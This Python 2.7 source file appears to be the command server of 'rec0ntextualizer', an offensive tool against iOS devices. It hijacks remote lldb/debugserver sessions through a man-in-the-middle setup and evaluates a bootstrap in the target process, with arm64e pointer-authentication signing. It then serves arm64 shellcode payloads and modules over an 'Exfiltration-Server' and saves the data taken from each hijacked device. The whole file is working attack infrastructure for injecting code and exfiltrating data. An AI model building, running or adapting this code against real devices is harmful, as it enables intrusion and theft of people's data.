#!/usr/bin/env python2.7

import os
import sys
import tty
import time
import glob
import types
import base64
import socket
import struct
import termios
import argparse
import threading
import functools
import subprocess

lldb = None

logger_lock = threading.Lock()
def _log(x, fmt, *args, **kwargs):
	logger_lock.acquire()
	print('[{}] {}\r'.format(x, '\r\n'.join(fmt.format(*args, **kwargs).splitlines())))
	logger_lock.release()

log_info = functools.partial(_log, '*')
log_error = functools.partial(_log, '!')


module_arch_to_payload_map = {
	'arm64': '__payload_arm64__',
	'arm64e': '__payload_arm64e__',
}

max_arch_len = max(map(len, module_arch_to_payload_map.keys()))

class Client(object):

	def __init__(self, rec0ntextualizer, sock, addr):
		self.rec0ntextualizer = rec0ntextualizer
		self.sock = sock
		self.addr = addr

		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
		self.log_info('New {} client', self.__class__.__name__)

	def get_hijacked_addr(self):
		_, data = self.get_tlv_packet()
		if data is None:
			self.log_error("Failed to get hijacked address")
			return False

		self.log_info("hijacked address {}", data)
		self.hijacked_addr = tuple(data.split(':'))
		return True

	def _log(self, f, fmt, *args, **kwargs):
		if hasattr(self, 'hijacked_addr'):
			fmt = '<hijacked session - {}:{}>: ' + fmt
			args = self.hijacked_addr + args
		else:
			fmt = '<{}:{}>: ' + fmt
			args = self.addr + args

		f(fmt, *args, **kwargs)

	def log_info(self, *args, **kwargs):
		self._log(log_info, *args, **kwargs)

	def log_error(self, *args, **kwargs):
		self._log(log_error, *args, **kwargs)

	def get_tlv_packet(self):
		'''
			Originally we planned to use actual tlv (type-length-value)
			packets but ended up using only length-value packets instead.
			The name across the whole project stayed the same though..
		'''

		try:
			size = self.sock.recv(8)
			actual_size = struct.unpack('<Q', size)[0]
			data = None

			if actual_size > 0:
				data = ''
				received = 0
				while (received < actual_size):
					d = self.sock.recv(actual_size - received)
					received += len(d)
					data += d

			return (actual_size, data)
		except:
			return (0, None)

	def handle(self):
		raise NotImplemented("yo this method needs to be implemented")


class LLDBReverseClient(Client):

	def handle(self):
		if self.get_hijacked_addr() == False:
			return

		self.debugger = lldb.SBDebugger.Create()
		self.target = self.debugger.CreateTarget('')
		self.debugger.SetAsync(True)

		self.log_info("Connecting")
		if self.connect() == False:
			self.log_error("Failed to connect")
			return

		self.log_info("Executing bootstrap")
		if self.execute_bootstrap() == False:
			self.log_error("Failed to execute bootstrap")
			return

		self.log_info("Detaching process")
		if self.detach_process() == False:
			self.log_error("Failed to detach from process")
			return

	def connect(self):
		error = lldb.SBError()
		self.process = self.target.ConnectRemote(
			self.debugger.GetListener(),
			'fd://{}'.format(self.sock.fileno()),
			'gdb-remote',
			error
		)

		return (
			self.process != None and
			error.success and
			self.wait_for_state((lldb.eStateConnected, lldb.eStateStopped))
		)

	def evaluate_expression(self, expression, timeout=60):
		options = lldb.SBExpressionOptions()
		options.SetTrapExceptions(False)
		options.SetTimeoutInMicroSeconds(timeout * 1000000)

		if not hasattr(self, '_imported_darwin'):
			ret = self.target.EvaluateExpression("@import Darwin", options)
			self._imported_darwin = True
			if not ret.IsValid():
				return None

		ret = self.target.EvaluateExpression(expression, options)
		if ret.IsValid():
			return ret
		return None

	def execute_bootstrap(self):
		session_id = ':'.join(self.hijacked_addr)
		arch = self.target.GetTriple().split('-')[0]

		# Expand device specific macros
		expression = self.rec0ntextualizer.bootstrap.format(
			PAC_SIGN_FUNC='__builtin_ptrauth_sign_unauthenticated((void *)p, 0, 0)' if arch == 'arm64e' else 'p',
			ARCH=arch + (max_arch_len - len(arch)) * ' ',
			SESSION_ID=session_id
		)

		return self.evaluate_expression(expression) != None

	def detach_process(self):
		error = self.process.Detach()
		return (
			error.success and
			self.wait_for_state(lldb.eStateDetached)
		)

	def wait_for_state(self, states, seconds=3):
		states = states if isinstance(states, (tuple, list, set)) else [states]

		self.log_info(
			"Waiting for process states: {}",
			[
				lldb.SBDebugger.StateAsCString(state)
				for state in states
			]
		)

		listener = self.debugger.GetListener()
		while seconds:
			seconds -= 1
			event = lldb.SBEvent()
			
			if listener.WaitForEvent(1, event) == False:
				continue

			if lldb.SBProcess.EventIsProcessEvent(event) == False:
				continue

			event_state = lldb.SBProcess.GetStateFromEvent(event)
			self.log_info( "Got process state: {}", lldb.SBDebugger.StateAsCString(event_state))

			if event_state in states:
				return True

		self.log_error("Process state never reached")
		return False


class ExfiltrationClient(Client):

	def handle(self):
		try:
			self.arch = self.sock.recv(max_arch_len).strip()
		except:
			return

		self.log_info("Sending payload")
		self.send_shellcode(self.rec0ntextualizer.payload[self.arch])

		if self.get_hijacked_addr() == False:
			return

		self.run_modules()

	def send_shellcode(self, shellcode):
		try:
			self.sock.sendall(struct.pack('<Q', len(shellcode)))
			self.sock.sendall(shellcode)
		except:
			pass

	def run_module(self, module):
		self.log_info("Sending module {}", module.__name__)
		self.send_shellcode(getattr(module, module_arch_to_payload_map[self.arch]))
		artifacts_dir = self.get_artifacts_dir_for_module(module)
		module.handle_client(self, artifacts_dir)

	def run_modules(self):
		for module in self.rec0ntextualizer.modules:
			self.run_module(module)

	def get_artifacts_dir_for_module(self, module):
		artifacts_dir = os.path.join(
			self.rec0ntextualizer.working_dir,
			'artifacts',
			'_'.join(self.hijacked_addr),
			module.__name__
		)

		if not os.path.exists(artifacts_dir):
			os.makedirs(artifacts_dir)

		return artifacts_dir


class Server(object):

	def __init__(self, rec0ntextualizer, name, client_cls, port, max_clients=16):
		self.rec0ntextualizer = rec0ntextualizer
		self.name = name
		self.client_cls = client_cls
		self.port = port
		self.max_clients = max_clients
		
		self.clients = []
		self.sock = None
		self.should_stop = threading.Event()
		self.thread = None

		self.start()

	def run(self):
		try:
			while not self.should_stop.is_set():
				csock, addr = self.sock.accept()
				t = threading.Thread(target=self.addClient, args=((csock, addr),))
				t.start()
		except:
			pass

	def start(self):
		log_info('Starting {} at {}:{}', self.name, self.rec0ntextualizer.address, self.port)

		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.sock.bind((self.rec0ntextualizer.address, self.port))
		self.sock.listen(self.max_clients)

		self.thread = threading.Thread(target=self.run)
		self.thread.start()

	def stop(self):
		log_info('Stopping {}', self.name, self.rec0ntextualizer.address, self.port)

		self.should_stop.set()
		os.close(self.sock.fileno()) # Because socket.close seem to be broken on macOS..
		self.thread.join()

	def addClient(self, client):
		c = self.client_cls(self.rec0ntextualizer, *client)
		self.clients.append(c)
		c.handle()

	def removeClient(self):
		pass

	def findClient(self, address=None, port=None):
		pass


class rec0ntextualizer(object):

	def __init__(self, reverse_lldb_server_port, exfiltration_server_port):
		self.print_header()
		self.parse_args()

		log_info("Initializing rec0ntextualizer")

		global lldb
		lldb = self.load_lldb()

		self.working_dir = os.path.dirname(os.path.realpath(__file__))
		self.shellcode_dir = os.path.join(self.working_dir, 'shellcode')

		failed = (
			lldb == None or
			not self.get_iface_ipv4_addr() or
			not self.load_bootstrap(exfiltration_server_port) or
			not self.load_payload() or
			not self.load_modules()
		)

		if failed:
			log_error("Error initializing rec0ntextualizer")
			sys.exit(1)

		log_info("Initialization done")

		self.reverse_lldb_server = Server(
			self,
			'Reverse-lldb-Server',
			LLDBReverseClient,
			reverse_lldb_server_port
		)

		self.exfiltration_server = Server(
			self,
			'Exfiltration-Server',
			ExfiltrationClient,
			exfiltration_server_port
		)

		self.wait_for_exit()

		self.reverse_lldb_server.stop()
		self.exfiltration_server.stop()

	def print_header(self):
		print("          __      _           _");
		print("      __ /  \\ _ _| |_ _____ _| |_ ___ _ __ _  _");
		print("     / _| () | ' \\  _/ -_) \\ /  _/ _ \\ '  \\ || |");
		print("     \\__|\\__/|_||_\\__\\___/_\\_\\\\__\\___/_|_|_\\_, |");
		print("       (c) 2019-2020 @danyl931 @pimskeks   |__/\n");

	def parse_args(self):
		parser = argparse.ArgumentParser()
		parser.add_argument(
			'-i',
			'--interface',
			dest='iface',
			help="External interface name, accesible by device and MITM machine",
			required=True
		)

		self.args = parser.parse_args()

	def get_iface_ipv4_addr(self):
		try:
			proc = subprocess.Popen(['ifconfig', self.args.iface], stdout=subprocess.PIPE)
			for l in iter(proc.stdout.readline, ''):
				if l.startswith('\tinet '):
					self.address = l.split(' ')[1]
					return True
		except:
			pass

		log_error("Failed to get ip for iface: {}", self.args.iface)
		return False

	def load_lldb(self):
		proc = subprocess.Popen(['lldb', '-P'], stdout=subprocess.PIPE)
		lldb_module_path = proc.stdout.read()[:-1]
		
		if lldb_module_path[-1] == '3':
			lldb_module_path = lldb_module_path[:-1]
		sys.path.insert(0, lldb_module_path)
		
		try:
			import lldb
		except:
			log_info('Failed to load lldb')
			return None

		log_info('Loaded lldb')
		return lldb

	def load_bootstrap(self, port):
		try:
			with open(os.path.join(self.working_dir, 'src', 'rec0ntextualizer', 'bootstrap.c'), 'rb') as f:
				# Remove comments and empty lines
				self.bootstrap = ''.join([x for x in iter(f.readline, '') if not x.startswith('//') and len(x) > 1])

				# Expand exfiltration server address and port macros
				self.bootstrap = self.bootstrap.format(
					IP_ADDRESS=self.address,
					PORT_NUMBER=str(port)
				)

				log_info('Loaded bootstrap')
				return True
		except Exception as e:
			log_error("Failed to load bootstrap: {}", e)
			return False

	def load_payload(self):
		try:
			self.payload = {}

			for arch in module_arch_to_payload_map.keys():
				with open(os.path.join(self.shellcode_dir, 'payload.{}.bin'.format(arch)), 'rb') as f:
					self.payload[arch] = f.read()

			log_info('Loaded payload')
			return True
		except Exception as e:
			log_error("Failed to load payload: {}", e)
			return False

	def load_modules(self):
		def load_module(path):
			with open(path, 'rb') as f:
				code = f.read()
				module = types.ModuleType(os.path.basename(path)[:-7])
				exec(code, module.__dict__)

				if False in (hasattr(module, x) for x in module_arch_to_payload_map.values() + ['handle_client']):
					log_error('Failed to load module: {}', path)
					return None

				try:
					for arch in module_arch_to_payload_map.values():
						setattr(module, arch, base64.b64decode(getattr(module, arch)))
				except:
					log_info('Failed to decode module "{}" payload', module.__name__)
					return None

				log_info('Loaded module {}', module.__name__)
				return module

		self.modules = {load_module(x) for x in glob.glob(os.path.join(self.shellcode_dir, 'modules', '*.module'))}
		if None in self.modules:
			self.modules.remove(None)
		
		if len(self.modules) == 0:
			log_error("No modules found")
			return False
		return True

	def wait_for_exit(self):
		log_info("-- Press q or ^C to quit --")
		
		try:
			fd = sys.stdin.fileno()
			old_settings = termios.tcgetattr(fd)
			tty.setraw(sys.stdin.fileno())
			while ord(sys.stdin.read(1)) not in [3, 81, 113]:
				log_error("-- Press q or ^C to quit --")
		finally:
			termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

		log_info("Exiting..")


if __name__ == '__main__':
	rec0ntextualizer(4141, 1337)
